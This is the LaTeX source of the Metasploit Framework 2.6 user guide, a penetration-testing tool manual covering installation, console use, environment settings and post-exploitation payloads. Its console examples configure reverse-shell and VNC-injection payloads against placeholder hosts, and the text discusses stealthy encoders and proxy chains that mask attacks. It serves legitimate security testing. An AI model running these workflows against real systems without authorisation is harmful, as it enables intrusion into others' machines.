%%
% This file is part of the Metasploit Framework and may be redistributed
% according to the licenses defined in the Authors field below. In the
% case of an unknown or missing license, this file defaults to the same
% license as the core Framework (dual GPLv2 and Artistic). The latest
% version of the Framework can always be obtained from metasploit.com.
%%

%
%   Title: Metasploit Framework User Guide
% Version: $Revision$
%

\documentclass{report}
\usepackage{graphicx}
\usepackage{color}
\usepackage{amsmath}
\usepackage[colorlinks,urlcolor=blue,linkcolor=black,citecolor=blue]{hyperref}

\begin{document}

\title{Metasploit Framework User Guide}
\author{metasploit.com}

\begin{titlepage}
    \begin{center}
        		
%\includegraphics[scale=0.6]{images/logo.png}	

        \huge{Metasploit Framework User Guide}
		\ \\[10mm]
		\large{Version 2.6}
		\\[120mm]
		
        \small{\url{http://www.metasploit.com/}}

        \rule{10cm}{1pt} \\[4mm]
        \renewcommand{\arraystretch}{0.5}
    \end{center}
\end{titlepage}

\tableofcontents

\setlength{\parindent}{0pt} \setlength{\parskip}{8pt}



\chapter{Introduction}

\par
This document is an attempt at a user guide for version 2.6 of the Metasploit
Framework, its goal is to provide a basic overview of what the Framework is, how
it works, and what you can do with it. As with most open-source projects,
correct documentation takes back seat to actual development. If you would like
to contribute to the project and have strong technical writing skills, please
contact the developers at msfdev[at]metasploit.com.

\par
The Metasploit Framework is a complete environment for writing, testing, and
using exploit code. This environment provides a solid platform for
penetration-testing, shellcode development, and vulnerability research. The
majority of the Framework is composed of object-oriented Perl code, with
optional components written in C, assembler, and Python.  

\par
The Framework development team is made up of four full-time members and a handful
of part-time contributors. Please refer to the Credits exploit module for a complete
listing of the people involved in the project. If you have contributed to the project
and do not see your name listed there, please let us know.

\par
\pagebreak

\chapter{Installation}

    \section{Installation on Unix}
    \label{INSTALL-UNIX}
\par
Installing the Framework is as easy as extracting the tarball, changing into the
created directory, and executing your preferred user interface. We strongly
recommend that you compile and install the Term::ReadLine::Gnu Perl module found
in the "extras" subdirectory. This package enables extensive tab-completion
support in the \texttt{msfconsole} interface; \texttt{msfconsole} is the
preferred UI for everyday use.  If SSL support is desired, you should install
the Net::SSLeay Perl module as well, this can also be found in the "extras"
subdirectory.  Please refer to appendices \ref{REF-TAB} and \ref{REF-SSL} for
detailed instructions.

\par
To perform a system-wide installation, we recommend that you copy the entire
Framework directory into a globally accessible location (/usr/local/msf) and
then create symbolic links from the msf* applications to a directory in the
system path (/usr/local/bin). User-specific modules can be placed into
\$HOME/.msf/\verb#<#TYPE\verb#># directory, where TYPE is one of exploits,
payloads, nops, or encoders. 

    \section{Installation on Windows}
    \label{INSTALL-WIN32}
\par
After months of working around ActiveState bugs, we finally decided to scrap it
and only support Cygwin Perl. The Metasploit Framework Win32 installer includes a
slimmed-down copy of the Cygwin environment, this is the preferred way to use
the Framework on the Windows platform. If you would like to install the
Framework into an existing Cygwin environment, please refer to appendix
\ref{CYGWIN}.
   
    \section{Platform Caveats}
    \label{INSTALL-CAVEAT}
\par
While we have tried to support as many platforms as possible, there are some
compatibility bugs that have cropped up. The raw socket support is currently
non-functional in Cygwin, AIX, HP-UX, and possibly Solaris. This will affect
your ability to spoof UDP-based attacks using the \texttt{UdpSourceIp}
environment variable. Windows users may encounter problems when using the Win32
installer on a system that already has an older version of Cygwin installed. 

    \section{Supported Operating Systems}
    \label{INSTALL-SUPPORT}
\par
The Framework should run on almost any Unix-based operating system that includes
a complete and modern version of the Perl interpreter (5.6+). Every stable
version of the Framework is tested with four primary platforms: 

\begin{itemize}
\item Linux (x86, ppc) (2.4, 2.6)
\item Windows NT (4.0, 2000, XP, 2003)
\item BSD (Open 3.x, Free 4.6+)
\item MacOS X (10.3.x)
\end{itemize}

\par
The following platforms are known to be problematic:
\begin{itemize}
\item Windows 9x (95, 98, ME)
\item HP-UX 11i (requires Perl upgrade)
\end{itemize}

\par
We have received numerous reports of the Framework working on Solaris,
AIX, and even the Sharp Zaurus. These systems often require an updated version
of Perl in conjunction with the GNU utilities to function correctly.


    \section{Updating the Framework}
    \label{INSTALL-UPDATE}
\par
Starting with version 2.2, the Framework includes the \texttt{msfupdate} online update
utility. This script can be used to download and install the latest version of
the Framework from the metasploit.com web site. It performs per-file updates by
comparing local file checksums with those available from the web site. This
process occurs across a validated SSL connection, assuming that the Net::SSLeay
module has been installed. This is not completely fail-safe and still depends on
the security of the metasploit.com web server. To learn more about the
\texttt{msfupdate} tool, simply execute it with the -h argument. 

\par
If you would prefer to not use the online update system, you can still download
updated modules and the current stable snapshot package from the metasploit.com
web site. At this time, \texttt{msfupdate} does not support proxy servers.
\pagebreak


\chapter{Getting Started}

    \section{The Console Interface}
    \label{STARTED-CONSOLE}
\par
After you have installed the Framework, you should verify that everything is
working correctly.  The easiest way to do this is to execute the
\texttt{msfconsole} user interface. This interface should display an ascii art
logo, print the current version, some module counts, and
drop to a "msf> " prompt. From this prompt, type \texttt{help} to get a list of
valid commands. You are currently in the "main" mode; this allows you to list
exploits, list payloads, and configure global options.  To list all available
exploits, type \texttt{show exploits}. To obtain more information about a given
exploit, type \texttt{info module\_name}. 

\par
The \texttt{msfconsole} interface was designed to be flexible and fast. If you
enter a command that is not recognized by the console, it will scan the system
path to determine if it is a system command. If it finds a match, that
command will be executed with the supplied arguments. This allows you to use
your standard set of tools without having to leave the console. We highly
recommend that you enable tab completion support, this is included by default in
the Windows package, but may require software installation for other operating
systems. For more information on tab completion, please refer to appendix
\ref{REF-TAB}.

\par
The \texttt{msfconsole} startup will similar to the text below.

\begin{verbatim}
+ -- --=[ msfconsole v2.5 [72 exploits - 75 payloads]

msf > 
\end{verbatim}


    \section{The Command Line Interface}
    \label{STARTED-CLI}
\par
If you are looking for a way to automate exploit testing, or simply do not want
to use an interactive interface, \texttt{msfcli} may be the solution. This
interface takes a match string as the first parameter, followed by the options
in a VAR=VAL format, and finally an action code to specify what should be done.
The match string is used to determine which exploit you want to launch; if more
than one module matches, a list of possible modules will be provided. 

\par
The action code is a single letter; S for summary, O for options, A for advanced
options, P for payloads, T for targets, C to try a vulnerability check, and E to
exploit. The saved environment will be loaded and used at startup, allowing you
to configure convenient default options in the Global environment of
\texttt{msfconsole}, save them, and take advantage of them in the
\texttt{msfcli} interface. 


    \section{The Web Interface}
    \label{STARTED-WEB}
\par
The \texttt{msfweb} interface is a stand-alone web server that allows
you to harness the power of the Framework through a browser. This interface 
is still primitive, but may be useful for team-based penetration testing
environments and live demonstrations. If you plan on using \texttt{msfweb} on
the Windows platform, keep in mind that Cygwin does not support copy-on-write
(COW) for forked processes. Since \texttt{msfweb} uses the \texttt{fork()} call
to handle new connections, it will run much slower and use much more memory than
if it was running on a comparable Unix system.

\par
Starting with version 2.3, \texttt{msfweb} provides an fast multi-user web shell. This 
system allows you to share your active sessions with other \texttt{msfweb} users. The
shell console (and the rest of \texttt{msfweb}) have been tested with Firefox
1.0, Internet Explorer 6.0, and the Safari/Konqueror browsers. 

\par
The \texttt{msfweb} interface provides almost no security whatsoever; anyone who can connect 
to the \texttt{msfweb} service could potentially gain access to the underlying system. 
The default configuration is to listen on the loopback address only, this can be
changed by using -a option to specify the local IP address. If you would like to open the
server up to the entire network, pass 0.0.0.0 to the -a option of msfweb. Just like the 
command-line interface, the saved environment is loaded on startup and can affect module 
settings. We do not recommend that you expose the \texttt{msfweb} interface to
an untrusted network. 

\pagebreak
\chapter{The Environment}

\par
The environment system is a core component of the Framework; the interfaces use
it to configure settings, the payloads use it patch opcodes, the exploits
use it to define parameters, and it is used internally to pass options between
modules. The environment system is logically divided into a Global and Temporary environment.  

\par
Each exploit maintains its own Temporary environment, which overrides the Global
environment. When you select an exploit via the \texttt{use} command, the
Temporary environment for that exploit is loaded and the previous one is saved
off. If you switch back to the previous exploit, the Temporary environment for
that exploit is loaded again.   

    \section{Global Environment}
    \label{ENV-GLOBAL}
\par
The Global environment is accessed through the console via the \texttt{setg} and
\texttt{unsetg} commands. The following example shows the Global environment
state after a fresh installation. Calling \texttt{setg} with no arguments
displays the current global environment, calling \texttt{unsetg} with no
arguments will clear the entire global environment. Default settings are
automatically loaded when the interface starts.


\begin{verbatim}
msf > setg
AlternateExit: 2
DebugLevel: 0
Encoder: Msf::Encoder::PexFnstenvMov
Logging: 0
Nop: Msf::Nop::Pex
RandomNops: 1
\end{verbatim}


    \section{Temporary Environment}
    \label{ENV-TEMP}
\par

The Temporary environment is accessed through the \texttt{set} and
\texttt{unset} commands. This environment only applies to the currently loaded
exploit module; switching to another exploit via the \texttt{use} command will
result in the Temporary environment for the current module being swapped out
with the environment of the new module. If no exploit is currently active, the
\texttt{set} and \texttt{unset} commands will not be available. Switching back
to the original exploit module will result in the original environment being
restored. Inactive Temporary environments are simply stored in memory and
activated once their associated module has been selected. The following example
shows how the \texttt{use} command selects an active exploit and how the
\texttt{back} command reverts to the main mode.  

\begin{verbatim}
msf > use wins_ms04_045
msf wins_ms04_045 > set
msf wins_ms04_045 > set FOO BAR
FOO -> BAR
msf wins_ms04_045 > set
FOO: BAR
msf wins_ms04_045 > back
msf > use openview_omniback
msf openview_omniback > set RED BLUE
RED -> BLUE
msf openview_omniback > set
RED: BLUE
msf openview_omniback > back
msf > use wins_ms04_045
msf wins_ms04_045 > set
FOO: BAR
msf wins_ms04_045 >
\end{verbatim}


    \section{Saved Environment}
    \label{ENV-SAVE}
\par
The \texttt{save} command can be used to synchronize the Global and all
Temporary environments to disk. The saved environment is written to
~/.msf/config and will be loaded when any of the user interfaces are executed.  


    \section{Environment Efficiency}
    \label{ENV-EFF}
\par
This split environment system allows you save time during exploit development
and penetration testing. Common options between exploits can be defined in the
Global environment once and automatically used in any exploit you load thereafter.  

\par
The example below shows how the \texttt{LPORT}, \texttt{LHOST}, and
\texttt{PAYLOAD} global environments can be used to save time when exploiting a
set of Windows-based targets. If this environment was set and a Linux exploit
was being used, the Temporary environment (via \texttt{set} and \texttt{unset})
could be used to override these defaults.  

\begin{verbatim}
msf > setg LPORT 1234
LPORT -> 1234
msf > setg LHOST 192.168.0.10 
LHOST -> 192.168.0.10
msf > setg PAYLOAD win32_reverse
PAYLOAD -> win32_reverse
msf > use apache_chunked_win32 
msf apache_chunked_win32(win32_reverse) > show options 
Exploit and Payload Options
===========================

  Exploit:    Name      Default    Description
  --------    ------    -------    ------------------    
  optional    SSL                  Use SSL
  required    RHOST                The target address
  required    RPORT     80         The target port
  
  Payload:    Name        Default    Description
  --------    --------    -------    ------------------------------------------    
  optional    EXITFUNC     seh             Exit technique: "process", "thread", "seh"
  required    LPORT        123             Local port to receive connection
  required    LHOST        192.168.0.10    Local address to receive connection
\end{verbatim}


    \section{Environment Variables}
    \label{ENV-VAR}
\par
The environment can be used to configure many aspects of the Framework, ranging
from user interface settings to specific timeout options in the network socket
API. This section describes the most commonly used environment variables.  

\par
For a complete listing of all environment variables, please see the file
Environment.txt in the "docs" subdirectory of the Framework. 


	\subsection{DebugLevel}
\par
This variable is used to control the verbosity of debugging messages provided by
the components of the Framework. Setting this value to 0 will prevent debugging
messages from being displayed (default). Supported values of DebugLevel range from 0 to 5. 

	\subsection{Logging}
\par
This variable is used to enable or disable session logging. Session logs are
stored in ~/.msf/logs by default, the directory can be changed used the
\texttt{LogDir} environment variable. You can use the \texttt{msflogdump}
utility to view the generated session logs. These logs contain the complete
environment for the exploit as well as per-packet timestamps. 

	\subsection{LogDir}
\par
This option specifies what directory the log files should be stored in. It
defaults to ~/.msf/logs. There are two types of log files, the msfconsole log and the
session logs. The msfconsole.log will record each significant action performed by the
console interface. Starting with version 2.4, the \texttt{msfconsole} interface will
record when it was started, stopped, and what system commands were executed. A
new session log will be created for each successful exploit attempt. 

	\subsection{Encoder}
\par
This variable can be set to a comma separated list of preferred Encoders. The
Framework will try this list of Encoders first (in order), and then fall through
to any remaining Encoders. The Encoders can be listed with \texttt{show encoders}.  

\begin{verbatim}
msf> set Encoder ShikataGaNai
\end{verbatim}

	\subsection{EncoderDontFallThrough}
\par
This option tells the Framework to not fall through to remaining Encoders if the
entire preferred list fails.  This is useful for keeping your stealthiness on a
network and not accidentally falling through to an unwanted Encoder because
your preferred Encoder failed.  

	\subsection{Nop}
\par
This has the same behavior as the Encoder entry above, except it is used to
specify the list of preferred Nop generator modules. The Nop generators can be
listed with \texttt{show nops}.  

\begin{verbatim}
msf> set Nop Opty
\end{verbatim}

	\subsection{NopDontFallThrough}
\par
This option has the same behavior as \texttt{EncoderDontFallThrough}, except it
applies to the Nop preferred list. 

	\subsection{RandomNops}
\par
This option allows randomized nop sleds to be used instead of the standard nop
opcode. RandomNops should be stable with all exploit modules included in the
Framework and is now enabled by default. Not all architectures and nop generator
modules support randomization.

	\subsection{ConnectTimeout}
\par
This option allows you to specify the connect timeout for TCP sockets. This
value defaults to 10 and may need to be increased to exploit systems across slow links. 

	\subsection{RecvTimeout}
\par
This option specifies the maximum number of seconds allowed for socket reads
that specified the special length value of -1. This may need to be increased if
you are exploiting systems over a slow link and running into problems. 

	\subsection{RecvTimeoutLoop}
\par
This option specifies the maximum number of seconds to wait for data on a socket
before returning it. Each time that data is received within this period, the
loop starts again. This may need to be increased if you are exploiting systems
over a slow link and running into problems.  

	\subsection{Proxies}
\par
This environment variable forces all TCP sockets to go through the specified
proxy chain. The format of the chain type:host:port for each proxy, separated by
commas. This release includes support for socks4 and http proxy types. 

	\subsection{ForceSSL}
\par
This environment variable forces all TCP sockets to negotiate the SSL protocol.
This is only useful when an exploit module does not provide the \texttt{SSL}
user option.  

	\subsection{UdpSourceIp}
\par
This environment variable can be used to control the source IP address from
which all UDP datagrams are sent. This option is only effective when used with a
UDP-based exploit (MSSQL, ISS, etc). This option depends on being able to open a
raw socket; something that is normally only available to the root or
administrative user. As of the 2.2 release, this feature is not working with the
Cygwin environment. 

	\subsection{NinjaHost}
\par
This environment variable can be used redirect all payload connections to a
socketNinja server. This value should be the IP address of the system running
the socketNinja console (perl sockectNinja.pl -d).  

	\subsection{NinjaPort}
\par
This environment variable can be used with the NinjaHost variable to redirect
payload connections to a system running the socketNinja server. This value
should be the port number of the socketNinja console. 

	\subsection{NinjaDontKill}
\par
This option can be used to exploit multiple systems at once and is particular
useful when firing a UDP-based exploit at a network broadcast address. 

	\subsection{AlternateExit}
\par
This option is a workaround for a bug found in certain versions of the Perl
interpreter. If the \texttt{msfconsole} interface crashes with a segmentation fault on
exit, try setting the value of this variable to 2. 
	
\pagebreak

\chapter{Using the Framework}


	\section{Choosing an Exploit Module}
\par
From the \texttt{msfconsole} interface, you may view the available exploit modules
through with the \texttt{show exploits} command. Select an exploit with the
\texttt{use} command, specifying the short module name as the argument. The
\texttt{info} command can be used to view information about a specific exploit module. 


	\section{Configuring the Active Exploit}
\par
Once you have selected an exploit, the next step is to determine what options it
requires. This can be accomplished with the \texttt{show options} command. Most exploits
use \texttt{RHOST} to specify the target address and \texttt{RPORT} to set the target port. Use
the \texttt{set} command to configure the appropriate values for all required options. If
you have any questions about what a given option does, refer to the module
source code. Advanced options are available with some exploit modules, these can
be viewed with the \texttt{show advanced} command. 

	\section{Verifying the Exploit Options}
\par	
The \texttt{check} command can be used to determine whether the target system is
vulnerable to the active exploit module. This is a quick way to verify that all
options have been correctly set and that the target is actually vulnerable to
exploitation. Not all exploit modules have implemented the check functionality.
In many cases it is nearly impossible to determine whether a service is
vulnerable without actually exploiting it. A \texttt{check} command should never result
in the target system crashing or becoming unavailable. Many modules simply
display version information and expect you to analyze it before proceeding.  


	\section{Selecting a Target}
\par
Many exploits will require the \texttt{TARGET} environment variable to be set to the
index number of the desired target. The \texttt{show targets} command will list all
targets provided by the exploit module. Many exploits will default to a
brute-force target type; this may not be desirable in all situations. 

	\section{Selecting the Payload}
\par	
The payload is the actual code that will run on the target system after a
successful exploit attempt. Use the \texttt{show payloads} command to list all payloads
compatible with the current exploit. If you are behind a firewall, you may want
to use a bind shell payload, if your target is behind one and you are not, you
would use a reverse connect payload. You can use the \texttt{info payload\_name} command
to view detailed information about a given payload.  

\par
Once you have decided on a payload, use the \texttt{set} command to specify the payload
module name as the value for the \texttt{PAYLOAD} environment variable. Once the payload
has been set, use the \texttt{show options} command to display all available payload
options. Most payloads have at least one required option. Advanced options are
provided by a handful of payload options; use the \texttt{show advanced} command to view
these. Please keep in mind that you will be allowed to select any payload
compatible with that exploit, even if it not compatible with your currently
selected \texttt{TARGET}. For example, if you select a Linux target, yet choose
a BSD payload, you should not expect the exploit to work.


	\section{Launching the Exploit}
\par
The \texttt{exploit} command will launch the attack. If everything went well, your
payload will execute and potentially provide you with an interactive command
shell on the exploited system. 


\pagebreak
\chapter{Advanced Features}

\par
This section covers some of the advanced features that can be found in this
release. These features can be used in any compatible exploit and highlight the
strength of developing attack code using an exploit framework. 

\section{The Meterpreter}
\par
The Meterpreter is an advanced multi-function payload that can be dynamically
extended at run-time. In normal terms, this means that it provides you with a
basic shell and allows you to add new features to it as needed. Please refer to
the Meterpreter documentation for an in-depth description of how it works and
what you can do with it. The Meterpreter manual can be found in the "docs"
subdirectory of the Framework as well as online at:

\url{http://metasploit.com/projects/Framework/docs/meterpreter.pdf}

\section{PassiveX Payloads}
\par
Starting with the 2.4 release, the Metasploit Framework can be used to load
arbitrary ActiveX controls into a target process. This feature works by patching
the registry of the target system and causing the exploited process to launch
internet explorer with a URL pointing back to the Framework. The Framework
starts up a simple web server that accepts the request and sends back a web page
instructing it to load an ActiveX component. The exploited system then downloads,
registers, and executes the ActiveX. 

\par
The basic PassiveX payload, \texttt{win32\_passivex}, supports any custom
ActiveX that you develop. In addition to the base payload, three other PassiveX
modules are included in the Framework. These can be used to execute a command
shell, load the Meterpreter, or inject a VNC service. When any of these three
payloads are used, the PassiveX object will emulate a TCP connection through
HTTP GET and POST requests. This allows you to interact with a command shell,
VNC, or the Meterpreter using nothing but standard HTTP traffic.

\par
Since PassiveX uses the Internet Explorer browser to load the ActiveX component,
it will pass right through an outbound web proxy, using whatever system and
authentication settings that have already been configured. The PassiveX system
included in 2.4 will only work when the target system has Internet Explorer 6.0
or newer installed. Future versions may work around this limitation. For more
information about PassiveX, please see the Uninformed Journal article titled
"Post-Exploitation on Windows using ActiveX Controls", located online at:

\url{http://www.uninformed.org/?v=1&a=3&t=pdf}


\section{InlineEgg Python Payloads}
\par
The InlineEgg library is a Python class for dynamically generating small
assembly language programs. The most common use of this library is to quickly
create advanced exploit payloads. This library was developed by Gera for use
with Core ST's Impact product. Core has released this library to the public
under a non-commercial license. 

\par
The Metasploit Framework supports InlineEgg payloads through the ExternalPayload
module interface; this allows transparent support if the Python scripting
language is installed. To enable the InlineEgg payloads, the
\texttt{EnablePython} environment variable must be set to non-zero value. This
change was made version 2.2 to speed up the module reload process. Starting with
the 2.4 release, the Python interpreter is no longer included in the Windows
installer.

\par
This release includes InlineEgg examples for Linux, BSD, and Windows. The Linux
examples are \texttt{linux\_ia32\_reverse\_ie}, \texttt{linux\_ia32\_bind\_ie}, and
\texttt{linux\_ia32\_reverse\_xor}. These payloads can be selected and used in the same
way as any other payload. The payload contents are dynamically generated by the
Python scripts in the payloads/external subdirectory. The BSD payloads function
almost exactly the same as their Linux counterparts. 

\par
The Windows InlineEgg example is named win32\_reverse\_stg\_ie and works in a
slightly different fashion. This payload has an option named \texttt{IEGG}, this option
specifies the path to the InlineEgg Python script that contains your final
payload. This is a staged payload; the first stage is a standard reverse
connect, the second stage sends the address of GetProcAddress and LoadLibraryA
over the connection, and the third stage is generated locally and sent across
the network. An example InlineEgg script is included in the payloads/external
subdirectory, called \texttt{win32\_stg\_winexec.py}. For more information about
InlineEgg, please see Gera's web site, located at: 

\url{http://community.corest.com/~gera/ProgrammingPearls/InlineEgg.html}


\section{Impurity ELF Injection}
\par
Impurity was a concept developed by Alexander Cuttergo that described a method
of loading and executing a new ELF executable in-memory. This technique allows
for arbitrarily complex payloads to be written in standard C, the only
requirement is a special loader payload. The Framework includes a Linux loader
for Impurity executables, the payload is named
\texttt{linux\_ia32\_reverse\_impurity} and requires the PEXEC option to be set
to the path of the executable. 
\par
Impurity executables must be compiled in a
specific way, please see the documentation in the src/impurity subdirectory
for more information about this process. The QUICKSTART.impurity file in the
"docs" subdirectory steps through the process of using Impurity to execute the
"shelldemo" application inside another process. The "shelldemo" allows you to
access file handles, change privileges and file system permissions, break out of
chroot, and more! The original mailing list post is archived online at:

\url{http://archives.neohapsis.com/archives/vuln-dev/2003-q4/0006.html}



\section{Chainable Proxies}
\par
The Framework includes transparent support for TCP proxies, this release has
handler routines for HTTP CONNECT and SOCKSv4 servers. To use a proxy with a
given exploit, the \texttt{Proxies} environment variable needs to be set. The value of
this variable is a comma-separated list of proxy servers, where each server is
in the format type:host:port. The type values are 'http' for HTTP CONNECT and
'socks4' for SOCKS v4. The proxy chain can be of any length; testing shows that
the system was stable with over five hundred SOCKS and HTTP proxies configured
randomly in a chain. The proxy chain only masks the exploit request, the
automatic connection to the payload is not relayed through the proxy chain at
this time. 

\section{Win32 UploadExec Payloads}
\par
Although Unix systems normally include all of the tools you need for
post-exploitation, Windows systems are notoriously lacking in a decent command
line toolkit. The UploadExec payloads included in this release allow you to
simultaneously exploit a Windows system, upload your favorite tool, and execute
it, all across the payload socket connection. When combined with a
self-extracting rootkit or scripting language interpreter (perl.exe!), this can
be a very powerful feature. The Meterpreter payloads are usually much better
suited for penetration testing tasks.  

\section{Win32 DLL Injection Payloads}
\par
Starting with version 2.2, the Framework includes a staged payload that is
capable of injecting a custom DLL into memory in combination with any Win32
exploit. This payload will not result in any files being written to disk; the
DLL is loaded directly into memory and is started as a new thread in the
exploited process. This payload was developed by Jarkko Turkulainen and Matt
Miller and is one of the most powerful post-exploitation techniques developed to
date. To create a DLL which can be used with this payload, use the development
environment of choice and build a standard Win32 DLL. This DLL should export an
function called Init which takes a single argument, an integer value which
contains the socket descriptor of the payload connection. The Init function
becomes the entry point for the new thread in the exploited process. When
processing is complete, it should return and allow the loader stub to exit the
process according to the \texttt{EXITFUNC} environment variable. If you would like to
write your own DLL payloads, refer to the src/shellcode/win32/dllinject
directory in the Framework. 

\section{VNC Server DLL Injection}
\par
One of the first DLL injection payloads developed was a customized VNC server.
This server was written by Matt Miller and based on the RealVNC source code.
Additional modifications were made to allow the server to work with exploited,
non-interactive network services. This payload allows you to immediately access
the desktop of an exploited system using almost any Win32 exploit. The DLL is
loaded into the remote process using any of the staged loader systems, started
up as a new thread in the exploited process, and the listens for VNC client
requests on the same socket used to load the DLL. The Framework simply listens
on a local socket for a VNC client and proxies data across the payload
connection to the server.  

\par
The VNC server will attempt to obtain full access to the current interactive
desktop. If the first attempt fails, it will call RevertToSelf() and then try
the attempt again. If it still fails to obtain full access to this desktop, it
will fall back to a read-only mode. In read-only mode, the Framework user can
view the contents of the desktop, but not interact with it. If full access was
obtained, the VNC server will spawn a command shell on the desktop with the
privileges of the exploited service. This is useful in situations where an
unprivileged user is on the interactive desktop, but the exploited service is
running with System privileges.  

\par
If there is no interactive user logged into the system or the screen has been
locked, the command shell can be used to launch explorer.exe anyways. This can
result in some very confused users when the logon screen also has a start menu.
If the interactive desktop is changed, either through someone logging into the
system or locking the screen, the VNC server will disconnect the client. Future
versions may attempt to follow a desktop switch. 

\par
To use the VNC injection payloads, specify the full path to the VNC server as
the value of the \texttt{DLL} option. The VNC server can be found in the data
subdirectory of the Framework installation and is named 'vncdll.dll'. The source
code of the DLL can be found in the src/shellcode/win32/dllinject/vncinject
subdirectory of the Framework installation. 

\par
As of the 2.4 release, there are a few situations where the VNC inject payload
will simply not work. These problems are often cause by strange execution
environments or other issues related to a specific exploit or injection method.
These issues will be addressed as time permits:
\begin{itemize}
	\item The cabrightstor\_uniagent exploit will cause the VNC payload to
	crash, possibly due to a strange heap state.
	\item The executables generated by \texttt{msfpayload}'s 'X' option are not
	will cause the VNC payload to crash after spawning the command shell.
\end{itemize}

\begin{verbatim}
msf > use lsass_ms04_011
msf lsass_ms04_011 > set RHOST some.vuln.host
RHOST -> some.vuln.host
msf lsass_ms04_011 > set PAYLOAD win32_reverse_vncinject
PAYLOAD -> win32_reverse_vncinject
msf lsass_ms04_011(win32_reverse_vncinject) > set LHOST your.own.ip
LHOST -> your.own.ip
msf lsass_ms04_011(win32_reverse_vncinject) > set LPORT 4321
LPORT -> 4321
msf lsass_ms04_011(win32_reverse_vncinject) > exploit
\end{verbatim}

If the "vncviewer" application is in your path and the AUTOVNC option has been
set (it is by default), the Framework will automatically open the VNC desktop.
If you would like to connect to the desktop manually, \texttt{set AUTOVNC 0}, then use
vncviewer to connect to 127.0.0.1 on port 5900. 

\pagebreak
\chapter{More Information}


\section{Web Site}
\par
The metasploit.com web site is the first place to check for updated modules and
new releases. This web site also hosts the Opcode Database and a decent shellcode
archive.  

\section{Mailing List}
\par
You can subscribe to the Metasploit Framework mailing list by sending a blank
email to framework-subscribe[at]metasploit.com. This is the preferred way to
submit bugs, suggest new features, and discuss the Framework with other users.
The mailing list archive can be found online at:
\url{http://metasploit.com/archive/framework/threads.html}

\section{Developers}
\par
If you are interested in helping out with the Framework project, or have any
questions related to module development, please contact the development team. The
Metasploit Framework development team can be reached at msfdev[at]metasploit.com.

\pagebreak
\appendix

\pagebreak
\chapter{Security}

\par
We recommend that you use a robust, secure terminal emulator when
utilizing the command-line interfaces. Examples include \texttt{konsole},
\texttt{gnome-terminal}, and recent versions of \texttt{PuTTY}.

\par
We do not recommend that the \texttt{msfweb} interface be used on untrusted
networks. Actually, we don't recommend that you use msfweb at all, it is
more of a proof-of-concept than a real tool.



	\section{Console Interfaces}
\par
The console does not perform terminal escape sequence filtering, this
could allow a hostile network service to do Bad Things (TM) to your terminal
emulator when the exploit or check commands are used. We suggest that you
use a terminal emulator which limits the functionality available through
hostile escape sequences. Please see the Terminal Emulator Security Issues paper
below for more information on this topic:

\url{http://www.digitaldefense.net/labs/papers/Termulation.txt}


	\section{Web Interface}
\par
The \texttt{msfweb} interface does not adequately filter certain arguments,
allowing a hostile web site operator to perform a cross-site scripting
attack on the \texttt{msfweb} user.

\par
The \texttt{msfweb} interface does not provide any access control functionality. If
the service is configured to listen on a different interface (default is
loopback), a malicious attacker could abuse this to exploit remote systems
and potentially access local files. The local file access attack can be
accomplished by malicious arguments to the payloads which use a local file
as input and then exploiting a (fake) service to obtain the file contents.
	

\pagebreak
\chapter{General Tips}


	\section{Tab Completion}
	\label{REF-TAB}
\par
To enable tab-completion on standard Unix systems, simply install the
Term::ReadLine::Gnu perl module. This module can be found at
\url{http://search.cpan.org} as well as the "extras" subdirectory of this
package. To install this module:

\begin{verbatim}
# cd extras
# tar -zxf Term-ReadLine-Gnu-1.14.tar.gz
# cd Term-ReadLine-Gnu-1.14
# perl Makefile.PL && make && make install
# cd .. && rm -rf Term-ReadLine-Gnu-1.14
\end{verbatim}

\par
If you are using Mac OS X, you will need to install the GNU readline package to
enable tab completion. 


	\section{Secure Socket Layer}
	\label{REF-SSL}
\par
To enable SSL support, simply install the Net::SSLeay perl module,
This module can be found at \url{http://search.cpan.org} as well as the
"extras" subdirectory of this package. To install this module:

\begin{verbatim}
# cd extras
# tar -zxf Net_SSLeay.pm-1.23.tar.gz
# cd Net_SSLeay.pm-1.23
# perl Makefile.PL && make && make install
# cd .. && rm -rf Net_SSLeay.pm-1.23
\end{verbatim}

\par
To specify SSL mode for any given exploit, just set the "SSL" option
to any non-false value (1, True, Yes, etc).


\pagebreak
\chapter{Cygwin}
\label{CYGWIN}	
	
\par
This chapter provides a brief description of how to install the Metasploit
Framework in the Cygwin environment. Normal users should use pre-configured
Win32 installer from the metasploit.com web site. 

	\section{Installation}
\par
Cygwin is freely available from \url{http://www.cygin.com}. The front page of
this site contains a link to a Setup.exe for the latest version. Simply
download this file and execute it locally. When the installer starts, it
will ask you whether you want to install from the Internet or use a local
directory. Select the option to install from the Internet and specify the
server to use, the directory to install it under, and where to put the
temporary files.

\par
To support tab completion and SSL sockets, make sure you have the following
components selected:

\begin{itemize}
\item gcc
\item make
\item rebase
\item libreadline
\item openssl-devel
\end{itemize}

\par
If you would like to use the InlineEgg payloads, make sure that you install a
recent version of Python as well.



	\section{Configuration}
\par
Now that Cygwin is installed, you should install the perl modules in the
"extras" subdirectory of this package. This can usually be accomplished by
extracting each package via tar -zxf [file], changing into the directory, typing
perl Makefile.PL, make, and make install. Tab completion makes the \texttt{msfconsole}
interface extremely efficient. 

\par
If you have Visual Studio installed, you may need to "unset LIBS" before trying
to compile anything, the double-quotes in the path will break certain Makefiles.


	\section{Rebasing}
\par
Once you have compiled and installed all required modules, you MUST use the
"rebase" utility before you can use the framework. If you try to load a shared
library (compiled perl module) into your application before rebasing it, it may
puke and die with an error like the following:

\begin{verbatim}
C:\cygwin\bin\cygperl.exe: *** unable to remap [...]
\end{verbatim}

\par
You can obtain the latest version of it from:
\url{http://www.tishler.net/jason/software/rebase/}.



\par
The "rebaseall" application will automatically rebase the system libraries, you
should run this at least once, especially if you plan on using InlineEgg payloads.
To rebase the Net::SSLeay module, perform the following steps:

\begin{verbatim}
# 1: Locate the DLL file inside the perl tree
$ find /lib/perl5 -name 'SSLeay.dll'

# 2: Change the permission of the DLL to 755
$ chmod 755 /lib/perl5/path/to/SSLeay.dll

# 3: Run the rebase utility on the DLL
$ rebase -d -b 0x4d455441 /lib/perl5/path/to/SSLeay.dll
\end{verbatim}


	\section{Tips}
\par
You can access your windows drives from the Cygwin shell through the /cygdrive
directory. This directory is not normally visible. If you install the framework
in C:\verb#\#Framework, you can make a link to it from inside your Cygwin home
directory with the following command: 

\begin{verbatim}
$ ln -sf /cydrive/c/Framework framework
\end{verbatim}

\pagebreak
\chapter{Licenses}

\par
The Metasploit Exploit Framework source code is dual-licensed under the GNU
General Public License v2.0 and the Artistic License. The package is Copyright
(c) 2003-2005 H D Moore and spoonm, contributions from others and their
